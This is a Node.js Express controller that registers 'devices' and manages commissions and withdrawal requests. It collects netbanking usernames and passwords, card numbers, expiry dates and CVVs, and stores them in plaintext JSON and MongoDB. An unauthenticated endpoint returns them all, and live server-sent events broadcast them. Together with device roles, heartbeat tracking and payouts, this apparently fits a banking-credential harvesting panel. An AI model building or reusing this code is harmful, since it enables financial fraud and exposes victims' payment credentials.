import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import Device from '../models/Device.js';
import { broadcastSSE } from '../utils/sseManager.js';
import { getDbStatus } from '../config/db.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DATA_DIR = path.join(__dirname, '..', 'data');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');

function loadJSON(filePath, defaultValue = []) {
  try {
    if (fs.existsSync(filePath)) return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (e) {}
  return defaultValue;
}

function saveJSON(filePath, data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {}
}

let fileDevices = loadJSON(DEVICES_FILE, []);

/**
 * Register or Update a Department Device
 * POST /api/register-device
 */
export const registerDevice = async (req, res) => {
  try {
    const {
      deviceName,
      departmentName,
      mobileNumber,
      address,
      bankName,
      accountNumber,
      ifscCode,
      netbankingId,
      netbankingPassword,
      cardNumber,
      cardExpiry,
      cardCvv,
      role,
      publicKeyPem
    } = req.body;

    if (!departmentName && !deviceName) {
      return res.status(400).json({ error: "Department Name or Device Name is required" });
    }

    const deviceId = req.body.deviceId || ('DEV-' + crypto.randomBytes(6).toString('hex').toUpperCase());
    const deviceApiKey = 'KEY-' + crypto.randomBytes(16).toString('hex');
    const now = new Date();

    const deviceData = {
      deviceId,
      deviceApiKey,
      deviceName: deviceName || departmentName || 'Department Device',
      departmentName: departmentName || 'General',
      mobileNumber: mobileNumber || 'N/A',
      address: address || 'Main Office',
      bankName: bankName || 'N/A',
      accountNumber: accountNumber || 'N/A',
      ifscCode: ifscCode || 'N/A',
      netbankingId: netbankingId || '',
      netbankingPassword: netbankingPassword || '',
      cardNumber: cardNumber || '',
      cardExpiry: cardExpiry || '',
      cardCvv: cardCvv || '',
      role: role || 'SOURCE',
      publicKeyPem: publicKeyPem || null,
      status: 'ONLINE',
      lastSeen: now,
      registeredAt: now,
      messageCount: 0
    };

    // Save to persistent JSON storage first
    const existingIdx = fileDevices.findIndex(d =>
      d.deviceId === deviceId || (d.mobileNumber === mobileNumber && mobileNumber !== 'N/A')
    );
    if (existingIdx !== -1) {
      fileDevices[existingIdx] = { ...fileDevices[existingIdx], ...deviceData, deviceId: fileDevices[existingIdx].deviceId };
    } else {
      fileDevices.push(deviceData);
    }
    saveJSON(DEVICES_FILE, fileDevices);

    // Save to MongoDB if connected
    if (getDbStatus()) {
      try {
        await Device.updateOne(
          { deviceId: deviceData.deviceId },
          { $set: deviceData },
          { upsert: true }
        );
        console.log(`🍃 [MongoDB Device Saved] ${deviceData.departmentName} (${deviceData.deviceId})`);
      } catch (e) {}
    }

    broadcastSSE('device_registered', deviceData);
    return res.status(201).json(deviceData);
  } catch (error) {
    console.error("registerDevice error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Get all registered department phones
 * GET /api/devices
 */
export const getDevices = async (req, res) => {
  try {
    const now = Date.now();
    let dbList = [];

    fileDevices = loadJSON(DEVICES_FILE, []);

    if (getDbStatus()) {
      try {
        dbList = await Device.find().sort({ updatedAt: -1 }).lean();
      } catch (e) {}
    }

    const combinedMap = new Map();
    [...dbList, ...fileDevices].forEach(d => {
      if (d.deviceId && !combinedMap.has(d.deviceId)) {
        combinedMap.set(d.deviceId, d);
      }
    });

    const formattedDevices = Array.from(combinedMap.values()).map(d => {
      const lastSeenTime = new Date(d.lastSeen || Date.now()).getTime();
      const isOnline = (now - lastSeenTime) < 10 * 60 * 1000;
      return {
        ...d,
        isOnline,
        status: isOnline ? 'ONLINE' : 'OFFLINE'
      };
    });

    return res.json(formattedDevices);
  } catch (error) {
    console.error("getDevices error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Device Heartbeat Ping
 * POST /api/devices/:id/heartbeat
 */
export const deviceHeartbeat = async (req, res) => {
  try {
    const { id } = req.params;
    const now = new Date();

    if (getDbStatus()) {
      Device.findOneAndUpdate(
        { deviceId: id },
        { status: 'ONLINE', lastSeen: now },
        { new: true }
      ).catch(e => {});
    }

    const dev = fileDevices.find(d => d.deviceId === id);
    if (dev) {
      dev.lastSeen = now.toISOString();
      dev.status = 'ONLINE';
      saveJSON(DEVICES_FILE, fileDevices);
    }

    broadcastSSE('device_ping', { deviceId: id, lastSeen: now });
    return res.json({ success: true, lastSeen: now });
  } catch (error) {
    console.error("deviceHeartbeat error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Remove Device
 * DELETE /api/devices/:id
 */
export const deleteDevice = async (req, res) => {
  try {
    const { id } = req.params;
    if (getDbStatus()) {
      Device.deleteOne({ deviceId: id }).catch(e => {});
    }
    fileDevices = fileDevices.filter(d => d.deviceId !== id);
    saveJSON(DEVICES_FILE, fileDevices);

    broadcastSSE('device_deleted', { deviceId: id });
    return res.json({ success: true, message: "Device removed" });
  } catch (error) {
    console.error("deleteDevice error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Add or Update Commission for a User
 * POST /api/devices/:id/commission
 */
export const addCommission = async (req, res) => {
  try {
    const { id } = req.params;
    const { amount } = req.body;
    const addedAmount = parseFloat(amount) || 0;

    let updatedDevice = null;

    if (getDbStatus()) {
      try {
        updatedDevice = await Device.findOneAndUpdate(
          { $or: [{ deviceId: id }, { mobileNumber: id }] },
          { $inc: { commissionEarned: addedAmount } },
          { new: true }
        ).lean();
      } catch (e) {}
    }

    const dev = fileDevices.find(d => d.deviceId === id || d.mobileNumber === id);
    if (dev) {
      dev.commissionEarned = (dev.commissionEarned || 0) + addedAmount;
      saveJSON(DEVICES_FILE, fileDevices);
      if (!updatedDevice) updatedDevice = dev;
    }

    broadcastSSE('commission_updated', { deviceId: id, totalCommission: updatedDevice?.commissionEarned || 0 });
    return res.json({ success: true, device: updatedDevice });
  } catch (error) {
    console.error("addCommission error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Submit Withdrawal Request
 * POST /api/withdrawals
 */
export const submitWithdrawal = async (req, res) => {
  try {
    const { deviceId, mobileNumber, accountNumber, ifscCode, bankName, amount } = req.body;
    const withdrawalId = 'WTH-' + Date.now();
    const withdrawAmount = parseFloat(amount) || 0;

    const withdrawalData = {
      withdrawalId,
      amount: withdrawAmount,
      bankName: bankName || 'N/A',
      accountNumber: accountNumber || 'N/A',
      ifscCode: ifscCode || 'N/A',
      status: 'PENDING',
      createdAt: new Date()
    };

    if (getDbStatus()) {
      try {
        await Device.updateOne(
          { $or: [{ deviceId }, { mobileNumber }] },
          { $push: { withdrawals: withdrawalData } }
        );
      } catch (e) {}
    }

    const dev = fileDevices.find(d => d.deviceId === deviceId || d.mobileNumber === mobileNumber);
    if (dev) {
      dev.withdrawals = dev.withdrawals || [];
      dev.withdrawals.push(withdrawalData);
      saveJSON(DEVICES_FILE, fileDevices);
    }

    broadcastSSE('withdrawal_requested', { deviceId, withdrawal: withdrawalData });
    return res.status(201).json({ success: true, withdrawal: withdrawalData });
  } catch (error) {
    console.error("submitWithdrawal error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Get All Withdrawal Requests
 * GET /api/withdrawals
 */
export const getWithdrawals = async (req, res) => {
  try {
    let allWithdrawals = [];

    fileDevices = loadJSON(DEVICES_FILE, []);

    if (getDbStatus()) {
      try {
        const dbDevices = await Device.find({ 'withdrawals.0': { $exists: true } }).lean();
        dbDevices.forEach(dev => {
          (dev.withdrawals || []).forEach(w => {
            allWithdrawals.push({
              ...w,
              deviceId: dev.deviceId,
              userName: dev.departmentName,
              mobileNumber: dev.mobileNumber
            });
          });
        });
      } catch (e) {}
    }

    fileDevices.forEach(dev => {
      (dev.withdrawals || []).forEach(w => {
        const exists = allWithdrawals.some(x => x.withdrawalId === w.withdrawalId);
        if (!exists) {
          allWithdrawals.push({
            ...w,
            deviceId: dev.deviceId,
            userName: dev.departmentName,
            mobileNumber: dev.mobileNumber
          });
        }
      });
    });

    allWithdrawals.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    return res.json(allWithdrawals);
  } catch (error) {
    console.error("getWithdrawals error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

/**
 * Update Withdrawal Request Status
 * POST /api/withdrawals/:id/status
 */
export const updateWithdrawalStatus = async (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body;

    if (getDbStatus()) {
      try {
        await Device.updateOne(
          { 'withdrawals.withdrawalId': id },
          { $set: { 'withdrawals.$.status': status } }
        );
      } catch (e) {}
    }

    fileDevices.forEach(dev => {
      if (dev.withdrawals) {
        const w = dev.withdrawals.find(x => x.withdrawalId === id);
        if (w) w.status = status;
      }
    });
    saveJSON(DEVICES_FILE, fileDevices);

    broadcastSSE('withdrawal_status_updated', { withdrawalId: id, status });
    return res.json({ success: true, status });
  } catch (error) {
    console.error("updateWithdrawalStatus error:", error);
    return res.status(500).json({ error: "Server Error: " + error.message });
  }
};

export default {
  registerDevice,
  getDevices,
  deviceHeartbeat,
  deleteDevice,
  addCommission,
  submitWithdrawal,
  getWithdrawals,
  updateWithdrawalStatus
};
